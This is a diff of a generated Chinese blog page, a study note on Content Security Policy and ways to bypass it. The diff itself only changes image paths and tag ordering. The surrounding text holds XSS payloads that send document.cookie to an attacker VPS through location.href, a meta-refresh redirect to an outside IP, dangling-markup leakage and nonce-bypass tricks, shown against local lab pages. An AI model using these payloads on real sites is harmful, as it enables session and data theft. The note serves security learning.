@@ -15,25 +15,25 @@
 <meta property="og:site_name" content="Blackwatch&#39;s blog">
 <meta property="og:description" content="XSS是最常见、危害最大的网页安全漏洞，想要抵御它们，要采取非常多编程措施，非常麻烦。那么，有没有可以从根本上解决问题，浏览器自动禁止外部注入恶意脚本的方法呢？CSP应运而生。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog/source_posts/CSP浅析与绕过/1.png">
-<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog/source_posts/CSP浅析与绕过/2.png">
-<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog/source_posts/CSP浅析与绕过/8.png">
-<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog/source_posts/CSP浅析与绕过/3.png">
-<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog/source_posts/CSP浅析与绕过/4.png">
-<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog/source_posts/CSP浅析与绕过/5.png">
-<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog/source_posts/CSP浅析与绕过/6.png">
+<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/1.png">
+<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/2.png">
+<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/8.png">
+<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/3.png">
+<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/4.png">
+<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/5.png">
+<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/6.png">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-772405ea-738e-1.png">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-772ac830-738e-1.png">
 <meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-7734112e-738e-1.png">
-<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog/source_posts/CSP浅析与绕过/7.png">
-<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog/source_posts/CSP浅析与绕过/9.png">
+<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/7.png">
+<meta property="og:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/9.png">
 <meta property="article:published_time" content="2021-04-23T15:26:28.000Z">
-<meta property="article:modified_time" content="2021-04-23T15:54:07.191Z">
+<meta property="article:modified_time" content="2021-04-23T16:10:08.699Z">
 <meta property="article:author" content="Blackwatch">
 <meta property="article:tag" content="学习笔记">
 <meta property="article:tag" content="CSP">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog/source_posts/CSP浅析与绕过/1.png">
+<meta name="twitter:image" content="https://blackwatch219.github.io/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Blackwatch&#39;s blog" type="application/atom+xml">
   
@@ -288,11 +288,11 @@
 <p>CSP不影响location.href跳转，因为在大多数网站中的跳转功能都是靠前端实现的，如果限制跳转将会使网站很大一部分功能受到影响，所以利用跳转来绕过CSP是一个万能的方法；或者存在<code>script-src &#39;unsafe-inline&#39;;</code>这条规则也可以用该绕过方法</p>
 <h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (!isset($_COOKIE[&#39;a&#39;])) &#123;</span><br><span class="line">        setcookie(&#39;a&#39;,md5(rand(0,1000)));</span><br><span class="line">    &#125;</span><br><span class="line">        header(&quot;Content-Security-Policy: default-src &#39;self&#39;;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP Test&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP-safe&lt;&#x2F;h2&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if (isset($_GET[&#39;a&#39;])) &#123;</span><br><span class="line">        echo &quot;Your GET content&quot;.@$_GET[&#39;a&#39;];</span><br><span class="line">    &#125;&#x2F;&#x2F;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog\source_posts\CSP浅析与绕过\1.png"></p>
+<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/1.png"></p>
 <p>这个地方可以用location跳转：location.href(window.location/window.open)绕过</p>
 <h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">location.href=<span class="string">&quot;http://127.0.0.1&quot;</span>+<span class="built_in">document</span>.cookie;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog\source_posts\CSP浅析与绕过\2.png"></p>
+<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/2.png"></p>
 <p>在我们已经可以执行任意js脚本但由于CSP的阻拦我们的cookie无法带外传输，就可以用此方法</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href &#x3D; &quot;vps_ip:xxxx?&quot;+document.cookie</span><br></pre></td></tr></table></figure>
 
@@ -314,7 +314,7 @@
 <h3 id="meta网页跳转绕过"><a href="#meta网页跳转绕过" class="headerlink" title="meta网页跳转绕过"></a>meta网页跳转绕过</h3><p>与link标签原理相似，利用meta标签实现网页跳转</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;csp.php?xss&#x3D;&#x3D;&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;1;url&#x3D;http:&#x2F;&#x2F;150.158.188.194:7890&#x2F;&quot; &gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog\source_posts\CSP浅析与绕过\8.png"></p>
+<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/8.png"></p>
 <p>除此之外，meta标签还有一些不常用的功能有时也能起奇效</p>
 <ul>
 <li>meta可以控制缓存（在header没有设置的情况下），有时候可以用来绕过CSP nonce。</li>
@@ -336,7 +336,7 @@
 
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- B页面 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 下面模拟XSS --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.createElement(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="javascript">iframe.src=<span class="string">&quot;http://127.0.0.1/a.php&quot;</span>;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(iframe);</span></span><br><span class="line"><span class="javascript"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span>alert(iframe.contentWindow.document.getElementById(<span class="string">&#x27;flag&#x27;</span>).innerHTML),<span class="number">1000</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog\source_posts\CSP浅析与绕过\3.png"></p>
+<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/3.png"></p>
 <p><em>setTimeout是为了等待iframe加载完成</em></p>
 <p>你以为就这样就完了？那你果然和我一样天真了</p>
 <p>在找CSP绕过相关资料时，还发现了个好玩的东西（<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f1de775bc43e">zhazhami师傅的博客</a>）</p>
@@ -374,8 +374,8 @@
 <p>案例中codimd的CSP中使用了<code>www.google-analytics.com</code><br> 而<a href="www.google.analytics.com">www.google.analytics.com</a>中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP</p>
 <h4 id="demo-2"><a href="#demo-2" class="headerlink" title="demo"></a>demo</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog\source_posts\CSP浅析与绕过\4.png"></p>
-<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog\source_posts\CSP浅析与绕过\5.png"></p>
+<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/4.png"></p>
+<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/5.png"></p>
 <p>同理，在其他站点提供了可控静态资源的功能时，且CSP中允许了此站点，就可以用该方式绕过</p>
 <ul>
 <li>存在可控静态资源</li>
@@ -387,7 +387,7 @@
 
 <h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><p>当我们输入<code>http://127.0.0.1/2.php?xss=&lt;script src=data:text/plain,alert(1)</code>，我们可以发现<code>&lt;script</code>就会被变成一个属性，值为空，之后的<code>nonce=&#39;xxxxx&#39;</code></p>
 <p>会被当成我们输入的script标签中的一个属性，成功绕过<code>script-src</code></p>
-<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog\source_posts\CSP浅析与绕过\6.png"></p>
+<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/6.png"></p>
 <h4 id="demo2"><a href="#demo2" class="headerlink" title="demo2"></a>demo2</h4><p>但是在chrome中，虽然第二个&lt;script 被当成了属性名，但依旧会干扰chrome对标签的解析，造成错误，使我们的exp无法成功执行<br> <a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-772405ea-738e-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190511094533-772405ea-738e-1.png" alt="img"></a></p>
 <h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><p>这里可以用到标签的一个技巧，当一个标签存在两个同名属性时，第二个属性的属性名及其属性值都会被浏览器忽略</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 3.php --&gt;</span><br><span class="line">&lt;h1 a&#x3D;&quot;123&quot; b&#x3D;&quot;456&quot; a&#x3D;&quot;789&quot; a&#x3D;&quot;abc&quot;&gt;123&lt;&#x2F;h1&gt;</span><br></pre></td></tr></table></figure>
@@ -404,7 +404,7 @@
 <h4 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;csp.php?xss&#x3D;&lt;img src&#x3D;&quot;&#x2F;&#x2F;vps_ip?a&#x3D;</span><br></pre></td></tr></table></figure>
 
 <p>此时由于我们传入的src的引号没有闭合，html解析器会一直寻找第二个引号，而直到”<code>id</code>“前的引号出现之前，所有内容都会被当作src的值发送到我们的vps上</p>
-<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog\source_posts\CSP浅析与绕过\7.png"></p>
+<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/7.png"></p>
 <p>需要注意的是，chrome下这个exp并不会成功，因为chrome不允许发出的url中含有回车或&lt;</p>
 <ul>
 <li>可以加载外域资源 (img-src: *)</li>
@@ -422,7 +422,7 @@
 <p>csp限制了<code>/a/</code>目录，而我们的目标脚本在<code>/b/</code>目录下则如果这时候请求<code>redirect</code>页面去访问<code>/b/</code>下的脚本是可以通过csp的检查的</p>
 <h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;a&#x2F;redirect.php?url&#x3D;&#x2F;b&#x2F;test.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/blog\source_posts\CSP浅析与绕过\9.png"></p>
+<p><img src="/2021/04/23/CSP%E6%B5%85%E6%9E%90%E4%B8%8E%E7%BB%95%E8%BF%87/9.png"></p>
 <p>但这是有一个很严格的条件的，加载的资源所在的域必须和自身处于同域下(example.com)，也就是不可能通过302跳转去加载一个其他域下的脚本的，比如通过<code>a.com</code>的302跳转去加载<code>b.com</code>下的脚本是不可以</p>
 <p>但！又来个但是了，在实际环境中，比如某个站调用某个cdn，或者类似于<code>script-src example.com/scripts/ google.com/recaptcha/</code>，<code>google.com/script/*</code>下有个<code>evil.js</code>，然后刚好站内有个重定向，漏洞条件就已经成立了。</p>
 <ul>
@@ -701,6 +701,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">SQL</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">学习笔记</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">writeup</a>
               </li>
              
@@ -710,14 +718,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">PHP</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">学习笔记</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">SQL</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -737,15 +737,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">无参数RCE</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">php伪协议</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">文件包含漏洞</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">无参数RCE</a>
               </li>
              
               <li class="article-tag-list-item">
